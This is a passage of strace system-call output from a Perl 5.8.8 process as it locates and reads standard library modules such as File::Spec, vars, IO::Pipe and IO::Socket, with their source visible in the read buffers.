$file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
6823  07:15:42.839973 stat64("/etc/perl/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840006 stat64("/etc/perl/File/Spec.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840021 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840034 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840048 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840062 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840076 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840089 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840102 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840115 stat64("/usr/share/perl5/File/Spec.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840129 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840142 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840156 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.840169 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
6823  07:15:42.840191 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.840206 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.840218 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.840237 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
6823  07:15:42.840317 stat64("/etc/perl/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840332 stat64("/etc/perl/vars.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840345 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840358 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840372 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840385 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840400 stat64("/usr/lib/perl5/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840426 stat64("/usr/lib/perl5/vars.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840469 stat64("/usr/share/perl5/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840481 stat64("/usr/share/perl5/vars.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840511 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840523 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840537 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.840549 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
6823  07:15:42.840570 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
6823  07:15:42.840584 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c118) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.840596 _llseek(10, 0, [0], SEEK_CUR) = 0
6823  07:15:42.840613 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
6823  07:15:42.840728 stat64("/etc/perl/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840743 stat64("/etc/perl/warnings/register.pm", 0xbf80be5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840757 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840770 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf80be5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840785 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840805 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf80be5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840820 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840833 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf80be5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840847 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840860 stat64("/usr/share/perl5/warnings/register.pm", 0xbf80be5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840874 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840887 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf80be5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840901 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf80bf4c) = -1 ENOENT (No such file or directory)
6823  07:15:42.840928 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
6823  07:15:42.840950 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
6823  07:15:42.840965 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80bc68) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.840976 _llseek(11, 0, [0], SEEK_CUR) = 0
6823  07:15:42.840995 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
6823  07:15:42.841144 read(11, "", 4096) = 0
6823  07:15:42.841158 close(11)         = 0
6823  07:15:42.841360 _llseek(10, 1148, [1148], SEEK_SET) = 0
6823  07:15:42.841376 _llseek(10, 0, [1148], SEEK_CUR) = 0
6823  07:15:42.841387 close(10)         = 0
6823  07:15:42.841472 _llseek(8, 594, [594], SEEK_SET) = 0
6823  07:15:42.841488 _llseek(8, 0, [594], SEEK_CUR) = 0
6823  07:15:42.841498 close(8)          = 0
6823  07:15:42.841532 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841548 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.841562 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841576 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.841590 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841604 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.841619 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841631 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.841645 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841658 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.841672 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841685 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.841704 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.841717 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
6823  07:15:42.841739 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.841755 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.841767 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.841785 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
6823  07:15:42.842483 brk(0x8218000)    = 0x8218000
6823  07:15:42.842632 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
6823  07:15:42.843129 read(8, "", 4096) = 0
6823  07:15:42.843166 close(8)          = 0
6823  07:15:42.843552 read(6, "", 4096) = 0
6823  07:15:42.843585 close(6)          = 0
6823  07:15:42.843758 stat64("/etc/perl/IO/Pipe.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843775 stat64("/etc/perl/IO/Pipe.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843789 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843803 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843817 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843830 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843845 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843858 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843871 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843884 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843913 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.843953 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
6823  07:15:42.843975 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.844005 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.844017 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.844039 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
6823  07:15:42.844706 _llseek(6, 3425, [3425], SEEK_SET) = 0
6823  07:15:42.844725 _llseek(6, 0, [3425], SEEK_CUR) = 0
6823  07:15:42.844736 close(6)          = 0
6823  07:15:42.844761 stat64("/etc/perl/IO/Socket.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844775 stat64("/etc/perl/IO/Socket.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844789 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844802 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844816 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844830 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844844 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844856 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844870 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844882 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844938 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.844952 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
6823  07:15:42.844988 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.845003 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.845015 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.845033 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return 